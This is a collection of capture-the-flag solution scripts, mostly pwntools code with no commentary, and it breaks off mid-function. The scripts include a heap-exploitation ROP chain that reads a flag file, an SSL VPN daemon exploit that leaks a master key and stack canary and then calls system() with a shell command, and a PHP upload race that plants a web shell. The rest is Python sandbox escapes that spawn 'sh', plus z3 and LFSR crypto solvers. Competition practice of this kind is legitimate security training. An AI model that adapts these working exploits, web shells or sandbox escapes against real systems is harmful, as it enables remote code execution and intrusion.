\")\nbase=u64(p.read(8))-(0x7ffff7ffba70-0x7ffff7f4b000)\nlog.warning(hex(base))#0x7ffff7ffba80\nadd(0x50)#4\nputs=0x7ffff7fa9ed0-0x7ffff7f4b000+base\n\nadd(0x10)#5689\nadd(0x10)#6\nadd(0x10)#7\nadd(0x10)#8\nadd(0x10)#9\nfree(6)\nfree(8)\nvictim=0x00007ffff7ffb170-0x7ffff7f4b000+base\nbin_addr=0x00007ffff7ffba40-0x7ffff7f4b000+baseedit(5,0x80000000,b\"A\"*0x10+p64(0x21)+p64(0x20)+p64(bin_addr)+p64(victim)+p64(0x20)[:-1])\nadd(0x10)#6\nedit(5,0x80000000,b\"A\"*0x10+p64(0x21)+p64(0x20)+p64(victim)+p64(bin_addr)+p64(0x20)[:-1])\nadd(0x10)#8\nadd(0x10)#10\n\n\nleave=0x0000000000016992+base\nyyds=0x7ffff7fa9b30-0x7ffff7f4b000+base\nadd10=0x0000000000078aea+base\nret=0x7ffff7f61993-0x7ffff7f4b000+base\nrax=0x0000000000016a16+base\nrdi=0x0000000000015291+base\nrsi=0x000000000001d829+base\nrdx=0x000000000002cdda+base\nsystem=323456+base\nsys=0x7ffff7f94899-0x7ffff7f4b000+base\npayload=b'/flag\\0\\0\\0'+p64(rax)+p64(2)+p64(sys)+p64(rax)+p64(0)+p64(rsi)+p64(victim-0x100)+p64(add10)+p64(leave)+p64(0xbadbabe)\ntest=0x0000000000078aea+base\npayload+=p64(rdi)+p64(3)+p64(rdx)+p64(0x100)+p64(test)#payload+=p64(rdi)+p64(3)+p64(rsi)+p64(victim+0x10)+p64(test)\n#payload+=p64(0)*2+p64(rdx)+p64(0x100)+p64(rax)+p64(1)+p64(rdi)+p64(1)+p64(sys)\npayload+=p64(0)*2+p64(sys)+p64(rdi)+p64(1)+p64(rax)+p64(1)+p64(sys)\n#payload=b'/bin/sh\\0'+p64(rax)+p64(2)+p64(sys)+p64(rax)+p64(0)+p64(rdi)+p64(victim+0x10)+p64(add10)+p64(leave)+p64(0xbadbabe)+p64(ret)*1+p64(puts)\nprint(len(payload))\nedit(10,0x80000000,payload)#gdb.attach(p,'b *0x7ffff7fa5c4b')\ncmd(5)\np.interactive()\n\nfrom pwn import *\n\ncontext.log_level = 'debug'\n\n\ndef login():\n    p = remote('111.186.58.249', 32766, ssl=True)\n\n    content = b'name=rea1user&passwd=re4lp4ssw0rd'\n    total = len(content)\n    raw = b''\n    raw += b'POST /login HTTP/1.1\\r\\n'\n    raw += b'Content-Length: ' + str(total).encode('ascii') + b'\\r\\n'\n    raw += b'\\r\\n'\n    raw += content\n\n    p.send(raw)\n\n    p.recvuntil(b'login success')\n    return p\n\ndef wrap1(data):\n    return p32(0xDEADBEEF) + p16(len(data) + 6, endian='big') + data\n\ndef wip(a, b, c, d):\n    return p8(a) + p8(b) + p8(c) + p8(d)\n\ndef check_vip(p, val):\n    p.send(wrap1(p16(3) + p32(val, endian = 'big')))\n    buf = p.recvn(0xC)\n    return u32(buf[-4:])\n\ndef req_vip(p, val):\n    p.send(wrap1(p16(1) + p32(val, endian = 'big')))\n    assert p.recvn(4) == p32(0xDEADBEEF)\n    buf = p.recvn(2)\n    assert p.recvn(2) == p16(1)\n\n    sz = u16(buf, endian='big')\n    buf = p.recvn(sz - 8)\n    \n    return buf[16:]\n\ndef kickout(p, val, key):\n    p.send(wrap1(p16(4) + p32(val, endian = 'big') + key))\n    buf = p.recvn(0xC)\n    return u32(buf[-4:])\n\n\n\nprogbase = 0x5650d5f47000\n\n# delta = heap abs addr - progbase\ndelta = 0x5650d7d95640 - progbase\nprint(hex(delta))\n\n\nprog = ELF('./sslvpnd')\n\ndef calc_off(addr):\n    off = (delta - (addr - prog.address)) * 8\n    return off\n\nkey_off = calc_off(prog.sym['master_key'])\n\nmaster = login()\n\nbaseip = u32(wip(172, 31, 0, 0), endian = 'big')\n\nout = 0\nfor i in range(0x40):\n    r = check_vip(master, baseip - key_off + i)\n    out |= (r ^ 1) << i\n\nkey = p64(out)\nprint(key.hex())\nmaster_key = key\n\n\ntworkers = []\n\n# write dhcp_pool.cnt to negative\noff = calc_off(prog.sym['dhcp_pool'] + 0x18)\nbuf = 0x80000021\nori = 1\n\nfor i in [31, 5]:\n    kickout(master, baseip - off + i, master_key)\n\n\n\n# leak stack\nt = login()\nbuf = req_vip(t, baseip + 3)\ntworkers.append(t)\n\ncanary = buf[0x80:0x80 + 8]\nprint(canary.hex())\n\n\n\n# fixup\nfor i in [5, 31]:\n    t = login()\n    req_vip(t, baseip - off + i)\n    tworkers.append(t)\n\n\n\ndef write_buf(off, buf, old = None):\n    if old is None:\n        old = bytes(len(buf))\n\n    for i in range(len(buf)):\n        for j in range(8):\n            a = (buf[i] >> j) & 1   \n            b = (old[i] >> j) & 1  \n            o = baseip - off + (i * 8 + j)\n            if a != b:\n                if a == 1 and b == 0:\n                    kickout(master, o, master_key)\n                else:\n                    t = login()\n                    req_vip(t, o)\n                    tworkers.append(t)\n\n\nwrite_buf(calc_off(0x10600), b'./getflag>/tmp/swtql')\n\ndef g(t):\n    t = t[0:4][::-1] + t[4:8][::-1]\n    return t\n\npop_rdi = progbase + 0xCAC3\nret = progbase + 0xCAC4\ncommand = progbase + 0x10600\nsystem_plt = progbase + (prog.plt['system'] - prog.address)\nwrite_buf(calc_off(0x10640), g(canary) + g(p64(pop_rdi)) + g(p64(command)) + g(p64(ret)) + g(p64(system_plt)))\n\n\npad = p64(progbase)\nbuf = b''\nbuf += pad * 16 + p64(progbase + 0x10640)\nbuf += pad * 3 + p64(progbase + 0x10640 + 8) + p64(progbase + 0x10640 + 0x10) + p64(progbase + 0x10640 + 0x18) + p64(progbase + 0x10640 + 0x20)\n\nwrite_buf(calc_off(prog.sym['dhcp_pool'] + 0x20 + 8), buf)\n\noff = calc_off(prog.sym['dhcp_pool'] + 0x18)\nwrite_buf(off, p32(0x19), p32(1))\n\nreq_vip(master, baseip + 10)\n\nfrom pwn import *\n\ncontext.log_level = 'debug'\n\np = remote('111.186.58.249', 32766, ssl=True)\n\npath = '../user.txt'\npath = '../../tmp/swtql'\n\nuri = urlencode(path).encode('ascii')\nraw = b''\nraw += b'''GET ''' + uri + b''' HTTP/1.1\\r\\n'''\nraw += b'\\r\\n'\n\np.send(raw)\nout = p.recvall()\nout = out.partition(b'\\r\\n\\r\\n')[-1]\nopen('out', 'wb').write(out)\n\n# leak.py\nfrom pwn import *\n\ndebug = 0\n\n\ndef login() -> remote:\n    if debug:\n        p = remote('127.0.0.1', 443, ssl=True, level='error')\n    else:\n        p = remote('111.186.58.249', 36717, ssl=True, level='error')\n    data = 'name=rea1user&passwd=re4lp4ssw0rd'\n    packet = f'''POST /login HTTP/1.1\nContent-Length: {len(data)}\n\n{data}'''.replace('\\n', '\\r\\n')\n    p.send(packet)\n    p.recvuntil('success')\n    return p\n\n\ndef wrap(data):\n    return p32(0xdeadbeef) + p16(len(data) + 6, endian='big') + data\n\n\ndef check_vip(p, val, pack_only=False):\n    packet = wrap(p16(3) + p32(val, endian='big'))\n    if not pack_only:\n        p.send(packet)\n        buf = p.recvn(0xC)\n        return u32(buf[-4:])\n    else:\n        return packet\n\n\ndef req_vip(p, val, pack_only=False):\n    packet = wrap(p16(1) + p32(val, endian='big'))\n    if not pack_only:\n        p.send(packet)\n        buf = p.recvn(4)\n        buf = p.recvn(2)\n        sz = u16(buf, endian='big')\n        buf = p.recvn(sz - 6)\n\n        return u32(buf[2:6])\n    else:\n        return packet\n\n\ndef ip2long(ip):\n    \"\"\"\n    Convert an IP string to long\n    \"\"\"\n    packedIP = socket.inet_aton(ip)\n    return struct.unpack(\"!L\", packedIP)[0]\n\n\ndef leak(p, off, sz=8):\n    data = []\n    off <<= 3\n    packets = b''\n    for i in range(0, sz * 8, 8):\n        # out = 0\n        for j in range(8):\n            packets += check_vip(p, base - i - j - 1 - off, pack_only=True)\n\n    p.send(packets)\n    for i in range(0, sz * 8, 8):\n        out = 0\n        for j in range(8):\n            buf = p.recvn(0xC)\n            r = u32(buf[-4:])\n            out <<= 1\n            out |= r ^ 1\n        data.append(out)\n    return bytearray(data)\n\n\ndef kickout(p, val):\n    global mkey\n    p.send(wrap(p16(4) + p32(val, endian='big') + mkey))\n    buf = p.recvn(0xC)\n    return u32(buf[-4:])\n\nm = login()\nbase = ip2long('172.31.0.0')\ncrash_first = True\nif crash_first:\n    try:\n        check_vip(m, base - 0xffffff)  # force restart\n    except:\n        m.close()\n\n    m = login()\n\nif debug:\n    heap_param = 15\n    heap = 0\n    cb = 0x5651eaa9f000\nelse:\n    heap_param = 33\n    heap = 0\n    cb = 0\nif not heap:\n    # for x in range(0x100):\n    data = leak(m, heap_param * 16, 8)\n    heap = u64(data[:8], endian='big') + 0xc0 + (heap_param - 15) * 0x10\n\nlog.success(f'heap: 0x{heap:x}')\n\nif not cb:\n    heap_off = heap & 0xffff\n    t = 3\n    pro = log.progress('Leaking base...')\n    while True:\n        try:\n            t += 1\n            tmp = login()\n            pro.status(f'Try {t}...')\n            off = heap_off + 0x10000 * t\n            off <<= 3\n            check_vip(tmp, base - off)\n            pro.success(f'Try {t}...success')\n            cb = heap - heap_off - 0x10000 * t\n            break\n        except KeyboardInterrupt:\n            sys.exit(0)\n        except:\n            pro.status(f'Try {t}...Fail')\n        finally:\n            tmp.close()\n\n    pro = log.progress('Leaking accurate base...')\n    heap_off = heap - cb\n    t = 0\n    while True:\n        try:\n            tmp = login()\n            pro.status(f'Try {t}...')\n            off = heap_off + 0x1000 * t\n            t += 1\n            off <<= 3\n            check_vip(tmp, base - off)\n            pro.status(f'Try {t}...Fail')\n        except KeyboardInterrupt:\n            sys.exit(0)\n        except:\n            pro.success(f'Try {t}...success')\n            cb = heap - heap_off - 0x1000 * t\n            break\n        finally:\n            tmp.close()\n    cb += 0x2000\n    log.success(f'base: 0x{cb:x}')\n\nw = login()\npprint(leak(w, heap - cb - 8))\nm.interactive()\n\n#encoding:utf-8\nimport io\nimport requests\nimport threading\nfrom pwn import *\nimport os, sys\n\ncmd = '''whoami'''\n\npoc = '''@<?php\necho \"evoA yyds\";\nsystem('%s');\n?>''' % cmd\n\nf = open('shell.php', 'w')\nf.write(poc)\nf.close()\n\nos.system('rm -rf shell.zip;zip shell.zip shell.php')\n\nf = open('shell.zip', 'rb')\nZipContent = f.read()\nf.close()\n\ncentral_directory_idx = ZipContent.index(b'\\x50\\x4B\\x01\\x02')\nend_central_directory_idx = ZipContent.index(b'\\x50\\x4B\\x05\\x06')\n\n# 文件开头\nfile_local_header = ZipContent[:central_directory_idx]\n# 核心目录\ncentral_directory = ZipContent[central_directory_idx:end_central_directory_idx]\n# 结束\nend_central_directory = ZipContent[end_central_directory_idx:]\n\ndef GetHeaderOffset():\n    return u32(central_directory[42:46])\n\ndef SetHeaderOffset(offset):\n    return central_directory[:42] + p32(offset) + central_directory[46:]\n\ndef GetArchiveOffset():\n    return u32(end_central_directory[16:20])\n\ndef SetArchiveOffset(offset):\n    return end_central_directory[:16] + p32(offset) + end_central_directory[20:]\n\ndef Create(start, end):\n    length = len(start)\n    HeaderOffset = SetHeaderOffset(length + GetHeaderOffset())\n    ArchiveOffset = SetArchiveOffset(length + GetArchiveOffset())\n\n    NewZipContent = file_local_header + HeaderOffset + ArchiveOffset\n\n    return NewZipContent\n\nstart = b'upload_progress_'\nend = b'|a:5:{s:10:\"start_time\";i:1625309087;s:14:\"content_length\";i:336;s:15:\"bytes_processed\";i:336;s:4:\"done\";b:0;s:5:\"files\";a:1:{i:0;a:7:{s:10:\"field_name\";s:4:\"file\";s:4:\"name\";s:13:\"callmecro.txt\";s:8:\"tmp_name\";N;s:5:\"error\";i:0;s:4:\"done\";b:0;s:10:\"start_time\";i:1625309087;s:15:\"bytes_processed\";i:336;}}}'\n\nZipContent = Create(start, end)\nf = open(\"shell.zip\",\"wb\")\nf.write(ZipContent)\nf.close()\n\nsessid = 'callmecro'\nurl = 'http://111.186.59.2:50081/'\n\ndef write(session):\n    while True:\n        f = io.BytesIO(b'a' * 1024 * 1024)\n        r = session.post(url, data={'PHP_SESSION_UPLOAD_PROGRESS': ZipContent}, files={'file': ('callmecro.txt',f)}, cookies={'PHPSESSID': sessid})\n\ndef read(session):\n    while True:\n        r = session.post(url+'?yxxx=zip:///tmp/sess_'+sessid+'%23'+'shell', data={})\n        if '@evoA yyds' in r.text:\n            print(r.text.strip('@evoA yyds'))\n            event.clear()\n            sys.exit()\n\n\nevent=threading.Event()\nwith requests.session() as session:\n    for i in range(30):\n        threading.Thread(target=write,args=(session,)).start()\n    for i in range(30):\n        threading.Thread(target=read,args=(session,)).start()\nevent.set()\n\nx = [1, 1, 1, 1, 1, 1, 1, 1, 1, 1,\n     1, 1, 1, 1, 1, 1, 1, 1, 1, 1,\n     1, 1, 1, 1, 1, 1, 1, 1, 1, 1,\n     1, 1, 1, 1, 1, 1, 1, 1, 1, 1,\n     1, 1, 1, 1, 1, 1, 1, 1, 1, 1,\n     1, 1, 1, 1, 1, 1, 1, 1, 1, 1,\n     1, 1, 1, 1, 1, 1, 1, 1, 1, 1,\n     1, 1, 1, 1, 1, 1, 1, 1, 1, 1,\n     1, 1, 1, 1, 1, 1, 1, 1, 1, 1,\n     1, 1, 1, 1, 1, 1, 1, 1, 1, 1]\n\ncheck_data  = [[0, 8, 2],\n[0, 2, 3],\n[0, 5, 4],\n[0, 4, 2],\n[0, 6, 1], # 6 down\n[1, 0, 2],\n[1, 3, 2],\n[1, 1, 4],\n[1, 7, 3],\n[1, 9, 2],\n[2, 3, 2],\n[2, 4, 2],\n[2, 9, 3],\n[2, 7, 3],\n[2, 2, 2],\n[3, 1, 2],\n[3, 6, 3],\n[3, 5, 2],\n[3, 0, 2],\n[3, 8, 1]] # 89 left\nidxs = []\ncnt = 0\nfor d in check_data:\n    choice = d[0]\n    m = d[1]\n    r = d[2]\n    if choice == 2:\n        step = 1\n        idx = 10 * m\n    elif choice == 3:\n        step = -1\n        idx = 10 * (m+1) -1\n    elif choice == 0:\n        step = 10\n        idx = m\n    elif choice == 1:\n        step = -10\n        idx = 10 * 9 + m\n    print(step, idx)\n    j = 0\n    num = 0\n    max = -1\n    sum = 0\n    while True:\n        if j == 10:\n            break\n        c = x[idx]\n        # print(c)\n        assert 1<=c<=10\n        num |= (1 << c-1)\n        if c > max:\n            max = c\n            sum += 1\n        else:\n            idx += step\n            j += 1\n    # print(num, sum)\n    # print(1023, r)\n    if num == 1023: # 0b1111111111\n        if sum == r:\n            cnt += 1\nprint(cnt)\nif cnt == 20:\n    print(\"correct\")\n\nfrom pwn import *\nx = [9,8,4,5,3,2,10,1,6,7,\n2,7,8,3,1,5,9,4,10,6,\n4,3,1,2,10,9,8,6,7,5,\n5,10,7,9,4,3,6,2,8,1,\n7,6,10,8,2,1,4,9,5,3,\n3,1,2,6,7,8,5,10,4,9,\n10,9,5,1,6,4,2,7,3,8,\n6,5,9,10,8,7,1,3,2,4,\n1,2,3,4,5,6,7,8,9,10,\n8,4,6,7,9,10,3,5,1,2,\n]\nx = bytes(x)+b\"\\xc8\\x4c\\x08\\x80\"\n# p = process(\"./vp\")\np = remote(\"111.186.59.32\",\"20217\")\np.send(x)\nprint(p.recvall())\n\nfrom pwn import *\nimport base64\nfrom hashlib import sha256\nimport subprocess\nfrom time import sleep\n\ncontext(log_level='debug')\np = remote(\"111.186.58.164\", \"30212\")\na, res = p.recvline().split(b\" == \")\nres = res.strip()\nquestion = a.split(b\")\")[0].split(b\"+\")[1]\n\ntbl = b\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456790\"\ndef solve(question, res):\n    for i in tbl:\n        for j in tbl:\n            for k in tbl:\n                for l in tbl:\n                    ans = bytes([i,j,k,l])\n                    r = ans+question\n                    # print(sha256(r).hexdigest().encode())\n                    # print(res)\n                    if sha256(r).hexdigest().encode() == res:\n                        return ans\nans = solve(question, res)\nprint(ans)\np.sendline(ans)\n\nfor i in range(3):\n    p.recvuntil(\"Here is your challenge:\\n\\n\")\n    chall = p.recvline()\n    print(len(chall))\n    print(ans)\n    name = 'chall_' + ans.decode()\n    open(name, \"wb\").write(base64.b64decode(chall))\n\n    res = subprocess.Popen(['gdb', name], stdin=subprocess.PIPE) \n    res.stdin.write(b'\\nsource fuck.py\\na\\n\\nquit\\n')\n    res.stdin.flush()\n    sleep(5)\n    res.kill()\n    print(name)\n\n    #input()\n\n    with open('result.txt', 'rb') as f:\n        #final_ans = int.to_bytes(int(f.read()), 8, 'little')\n        final_ans = f.read()\n    p.send(final_ans)\n\np.interactive() \n\nimport gdb\nfrom z3 import *\n\ngdb.execute('b *0x401135')\n\ngdb.execute('b *0x4013d7')\ngdb.execute('r')\ngdb.execute('set $rip=0x4013ea')\n\ngdb.execute('set *(char*)(0x4014e0)=0xc3')\ngdb.execute('set *(char*)(0x400be0)=0x48')\ngdb.execute('set *(char*)(0x400be0+1)=0x31')\ngdb.execute('set *(char*)(0x400be0+2)=0xc0')\ngdb.execute('set *(char*)(0x400be0+3)=0xc3')\n\n\ngdb.execute('set *(char*)(0x4012a7+7)=0x1')\n\ngdb.execute('c')\ngdb.execute('ni')\n\naddr = int(gdb.parse_and_eval('$rax'))\nprint(hex(addr))\n\ngdb.execute('b *0x401329')\ngdb.execute('c')\ngdb.execute('ni')\n\ngdb.execute('dump binary memory image {} {}+0x30000'.format(addr, addr))\n\nwith open('image', 'rb') as f:\n    image = bytearray(f.read())\n\nfor i in range(0x30000):\n    #v = int(gdb.parse_and_eval('*(char*)({})'.format(addr + i))) & 0xff\n    if image[i] == 0xcc:\n        #gdb.execute('set *(char*)({}) = 0x90'.format(addr + i))\n        image[i] = 0x90\n\nwith open('image', 'wb') as f:\n    f.write(image)\n\ngdb.execute('restore image binary {} 0'.format(addr))\n\ngdb.execute('b *({}+*((long*)0x6060c0)+0x7a)'.format(addr))\n\n#gdb.execute('b *({}+*((long*)0x6060c0)+0x7a-0x24)'.format(addr))\n\ngdb.execute('c')\n\nans_ptr = int(gdb.parse_and_eval('$rdi'))\nprint(hex(ans_ptr))\ngdb.execute('ni')\nans_0 = int(gdb.parse_and_eval('*(unsigned int*){}'.format(ans_ptr)))\nans_1 = int(gdb.parse_and_eval('*(unsigned int*)({}+4)'.format(ans_ptr)))\n\nwith open('ans.txt', 'w') as f:\n    f.write(hex(ans_0))\n    f.write('\\n')\n    f.write(hex(ans_1))\n\ndef fuck(ans_0, ans_1, p_0, p_1):\n    #p_0 = 0x8861e08f\n    #p_1 = 0x7a867251\n    #p_0 = 0x27dbd098\n    #p_1 = 0x8c3d97df\n\n    v1 = p_0 >> 0x10\n    v2 = v1 * 7\n    v2 &= 0xffffffff\n\n    v2 = (v2 & 0xffff) - (v2 >> 0x10)\n    v2 &= 0xffffffff\n    v2 = v2 - (v2 >> 0x10)\n    v2 &= 0xffffffff\n\n    v3 = p_0 + 6\n    v3 &= 0xffffffff\n    v4 = (p_1 >> 0x10) + 5\n    v4 &= 0xffffffff\n    v5 = p_1 & 0xffff\n    v1 = v5 * 4\n    v1 &= 0xffffffff\n\n    v1 = (v1 & 0xffff) - (v1 >> 0x10)\n    v1 = v1 - (v1 >> 0x10)\n\n    v6 = (v4 ^ v2) & 0xffff\n    v5 = v6 * 3\n    v5 &= 0xffffffff\n\n    v5 = (v5 & 0xffff) - (v5 >> 0x10)\n    v7 = v5 - (v5 >> 0x10)\n\n    v6 = (v3 ^ v1) + v7 & 0xffff\n    v6 &= 0xffffffff\n    v5 = v6 * 2\n    v5 &= 0xffffffff\n\n    v5 = (v5 & 0xffff) - (v5 >> 0x10)\n    v5 = v5 - (v5 >> 0x10)\n    print(hex(p_0), hex(p_1), ans_0, ans_1, ((v2 ^ v5) << 0x10 | (v5 ^ v4) & 0xffff) & 0xffffffff, (((v1 ^ v7 + v5) & 0xffff | (v3 ^ v7 + v5) << 0x10) & 0xffffffff))\n    if ((v2 ^ v5) << 0x10 | (v5 ^ v4) & 0xffff) & 0xffffffff != ans_0:\n        return False\n\n    if (((v1 ^ v7 + v5) & 0xffff | (v3 ^ v7 + v5) << 0x10) & 0xffffffff) != ans_1:\n        return False\n\n    return True\n\ndef mysolve(ans_0, ans_1):\n    p_0 = BitVec('p0', 32)\n    p_1 = BitVec('p1', 32)\n\n    #p_0 = 0x8861e08f\n    #p_1 = 0x7a867251\n    #p_0 = 0x27dbd098\n    #p_1 = 0x8c3d97df\n\n    v1 = p_0 >> 0x10\n    v2 = v1 * 7\n\n    v2 = (v2 & 0xffff) - (v2 >> 0x10)\n    v2 = v2 - (v2 >> 0x10)\n\n    v3 = p_0 + 6\n    v4 = (p_1 >> 0x10) + 5\n    v5 = p_1 & 0xffff\n    v1 = v5 * 4\n\n    v1 = (v1 & 0xffff) - (v1 >> 0x10)\n    v1 = v1 - (v1 >> 0x10)\n\n    v6 = (v4 ^ v2) & 0xffff\n    v5 = v6 * 3\n\n    v5 = (v5 & 0xffff) - (v5 >> 0x10)\n    v7 = v5 - (v5 >> 0x10)\n\n    v6 = (v3 ^ v1) + v7 & 0xffff\n    v5 = v6 * 2\n\n    v5 = (v5 & 0xffff) - (v5 >> 0x10)\n    v5 = v5 - (v5 >> 0x10)\n\n    s = Solver()\n\n    s.add(\n\n        (v2 ^ v5) << 0x10 | (v5 ^ v4) & 0xffff == ans_0,\n        (v1 ^ v7 + v5) & 0xffff | (v3 ^ v7 + v5) << 0x10 == ans_1\n    )\n\n    if s.check() == sat:\n        m = s.model()\n\n        print(m[p_0])\n        print(m[p_1])\n        p_0 = int(m[p_0].as_long())\n        p_1 = int(m[p_1].as_long())\n\n        #print(hex(p_0 + 0x10000 + (p_1 << 32)))\n        #enc(p_0 + 0x10000 + (p_1 << 32))\n\n        if not fuck(ans_0, ans_1, p_0, p_1):\n            if fuck(ans_0, ans_1, p_0 + 0x100, p_1):\n                p_0 += 0x100\n            elif fuck(ans_0, ans_1, p_0 + 0x10000, p_1):\n                p_0 += 0x10000\n            elif fuck(ans_0, ans_1, p_0 + 0x10100, p_1):\n                p_0 += 0x10100\n            else:\n                raise Exception('fuck!!')\n\n\n        res = int.to_bytes(p_0, 4, 'little') + int.to_bytes(p_1, 4, 'little')\n        with open('result.txt', 'wb') as f:\n            f.write(res)\n    else:\n        raise Exception('fuck!')\n\n    #print((c1, c2))\n\nmysolve(ans_0, ans_1)\n\nfrom pwn import *\nimport hashlib\nimport random\nfrom z3 import *\n\n#---------------------original code---------------------#\ndef _prod(L):\n    p = 1\n    for x in L:\n        p *= x\n    return p\n\ndef _sum(L):\n    s = 0\n    for x in L:\n        s ^= x\n    return s\n\ndef n2l_0(x, l):\n    return list(map(int, '{{0:0{}b}}'.format(l).format(x)))\ndef n2l(x,l):\n    ans=[]\n    for i in range(l):\n        ans.append(x&1)\n        x=x>>1\n    return ans[::-1]\n\nx = 12387192379\nl = 64\nassert n2l_0(x,l) == n2l(x,l)\n\n    \nclass Generator1:\n    def __init__(self, key: list):\n        assert len(key) == 64\n        self.NFSR = key[: 48]\n        self.LFSR = key[48: ]\n        self.TAP = [0, 1, 12, 15]\n        self.TAP2 = [[2], [5], [9], [15], [22], [26], [39], [26, 30], [5, 9], [15, 22, 26], [15, 22, 39], [9, 22, 26, 39]]\n        self.h_IN = [2, 4, 7, 15, 27]\n        self.h_OUT = [[1], [3], [0, 3], [0, 1, 2], [0, 2, 3], [0, 2, 4], [0, 1, 2, 4]]\n\n    def g(self):\n        x = self.NFSR\n        return _sum(_prod(x[i] for i in j) for j in self.TAP2)\n\n    def h(self):\n        x = [self.LFSR[i] for i in self.h_IN[:-1]] + [self.NFSR[self.h_IN[-1]]]\n        return _sum(_prod(x[i] for i in j) for j in self.h_OUT)\n\n    def f(self):\n        return _sum([self.NFSR[0], self.h()])\n\n    def clock(self):\n        o = self.f()\n        self.NFSR = self.NFSR[1: ] + [self.LFSR[0] ^ self.g()]\n        self.LFSR = self.LFSR[1: ] + [_sum(self.LFSR[i] for i in self.TAP)]\n        return o\n\nclass Generator2:\n    def __init__(self, key):\n        assert len(key) == 64\n        self.NFSR = key[: 16]\n        self.LFSR = key[16: ]\n        self.TAP = [0, 35]\n        self.f_IN = [0, 10, 20, 30, 40, 47]\n        self.f_OUT = [[0, 1, 2, 3], [0, 1, 2, 4, 5], [0, 1, 2, 5], [0, 1, 2], [0, 1, 3, 4, 5], [0, 1, 3, 5], [0, 1, 3], [0, 1, 4], [0, 1, 5], [0, 2, 3, 4, 5], [\n            0, 2, 3], [0, 3, 5], [1, 2, 3, 4, 5], [1, 2, 3, 4], [1, 2, 3, 5], [1, 2], [1, 3, 5], [1, 3], [1, 4], [1], [2, 4, 5], [2, 4], [2], [3, 4], [4, 5], [4], [5]]\n        self.TAP2 = [[0, 3, 7], [1, 11, 13, 15], [2, 9]]\n        self.h_IN = [0, 2, 4, 6, 8, 13, 14]\n        self.h_OUT = [[0, 1, 2, 3, 4, 5], [0, 1, 2, 4, 6], [1, 3, 4]]\n\n    def f(self):\n        x = [self.LFSR[i] for i in self.f_IN]\n        return _sum(_prod(x[i] for i in j) for j in self.f_OUT)\n \n    def h(self):\n        x = [self.NFSR[i] for i in self.h_IN]\n        return _sum(_prod(x[i] for i in j) for j in self.h_OUT)        \n\n    def g(self):\n        x = self.NFSR\n        return _sum(_prod(x[i] for i in j) for j in self.TAP2)  \n\n    def clock(self):\n        self.LFSR = self.LFSR[1: ] + [_sum(self.LFSR[i] for i in self.TAP)]\n        self.NFSR = self.NFSR[1: ] + [self.LFSR[1] ^ self.g()]\n        return self.f() ^ self.h()\n\nclass Generator3:\n    def __init__(self, key: list):\n        assert len(key) == 64\n        self.LFSR = key\n        self.TAP = [0, 55]\n        self.f_IN = [0, 8, 16, 24, 32, 40, 63]\n        self.f_OUT = [[1], [6], [0, 1, 2, 3, 4, 5], [0, 1, 2, 4, 6]]\n\n    def f(self):\n        x = [self.LFSR[i] for i in self.f_IN]\n        return _sum(_prod(x[i] for i in j) for j in self.f_OUT)\n\n    def clock(self):\n        self.LFSR = self.LFSR[1: ] + [_sum(self.LFSR[i] for i in self.TAP)]\n        return self.f()\n\nclass zer0lfsr:\n    def __init__(self, msk: int, t: int):\n        if t == 1:\n            self.g = Generator1(n2l(msk, 64))\n        elif t == 2:\n            self.g = Generator2(n2l(msk, 64))\n        else:\n            self.g = Generator3(n2l(msk, 64))\n        self.t = t\n\n    def next(self):\n        for i in range(self.t):\n            o = self.g.clock()\n        return o\n#---------------------original code end---------------------#\n\n\n#----------------------------------pow------------------------------------------#\nalphabet = string.ascii_letters + string.digits + '!#$%&*-?'\n#print(alphabet)\nhost,port = \"111.186.59.28\",31337\ncontext.log_level = \"debug\"\nr = remote(host,port)\nr.recvuntil(\" + \")\nsuffix = str(r.recvuntil(\")\"))[2:-2]\nr.recvuntil(\" == \")\nresult = str(r.recvuntil(\"\\n\"))[2:-3]\nprint(result)\npow = \"\"\nwhile True:\n    prefix = \"\".join(random.choices(alphabet,k=4))\n    # print(prefix)\n    # print(prefix+suffix)\n    #print(hashlib.sha256((prefix+suffix).encode()).hexdigest())\n    if hashlib.sha256((prefix+suffix).encode()).hexdigest()==result:\n        pow = prefix\n        break\nr.sendline(pow)\n#---------------------------pow  end------------------------------------------#\n\n#------------------try generator i-------------------------#\nfor i in [1,3]:\n    r.recvuntil(\"one:\")\n    r.sendline(str(i))\n    s = Solver()\n    msk = BitVec('msk',64)\n    r.recvuntil(\"start:::\")\n    keystream = r.recvuntil(\":::end\").decode('latin-1')\n    print(keystream[-6:])\n    keystream = keystream[:-6]\n    print(len(keystream))\n    lfsr = zer0lfsr(msk, i)\n    lfsr_bits = []\n    for i in range(1000):\n        c = ord(keystream[i])\n        temp_list = []\n        for j in range(8):\n            temp_list.append(c&1)\n            c >>= 1\n        temp_list = temp_list[::-1]\n        lfsr_bits += temp_list\n    print(len(lfsr_bits))\n    for i in range(200):\n        s.add(lfsr_bits[i] == lfsr.next())\n        #print(i)\n    print(\"add finished\")\n    print(s.check())\n    #assert s.check()==sat\n    msk = s.model()[msk]\n    print(msk)\n    r.recvuntil(\"hint: \")\n    hint = r.recvuntil(\"\\n\").decode()[:-1]\n    assert hashlib.sha256(str(msk).encode()).hexdigest()\n    r.recvuntil(\"k:\")\n    r.sendline(str(msk))\nr.interactive()  \n\n        \n\n[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if \"'os.\" in str(x) ][0]['system']('sh')\n\nsub = ''.__class__.__base__.__subclasses__()\nwrap = sub[133] # os._wrap_close\ninit = wrap.__init__\nglb = init.__globals__\nglb[\"system\"](\"sh\")\n\nattrgetter = [ x for x in ''.__class__.__base__.__subclasses__() if \"operator.attrgetter\" in str(x) ][0]\n\nimport types\nimport dis\nimport os\nimport sys\nfrom opcode import opmap, cmp_op\n\ngift1 = 'class'\ngift2 = 'dict'\n\n\ndef gen_None():\n    return \\\n        bytes([opmap[\"BUILD_LIST\"], 0]) + \\\n        get_class() + \\\n        get_dict() + \\\n        gen_string(\"clear\") + \\\n        bytes([opmap[\"BINARY_SUBSCR\"], 0]) + \\\n        bytes([opmap[\"BUILD_LIST\"], 0]) + \\\n        call_function(1)\n\ndef gen_return():\n    return bytes([opmap[\"RETURN_VALUE\"], 0])\n\ndef get_class():\n    return bytes([opmap[\"LOAD_ATTR\"], 0])\n\ndef get_dict():\n    return bytes([opmap[\"LOAD_ATTR\"], 1])\n\ndef gen_true():\n    return \\\n        gen_empty_str() + \\\n        gen_empty_str() + \\\n        bytes([opmap[\"COMPARE_OP\"], cmp_op.index(\"==\")])\n\ndef gen_false():\n    return \\\n        gen_empty_str() + \\\n        gen_empty_str() + \\\n        bytes([opmap[\"COMPARE_OP\"], 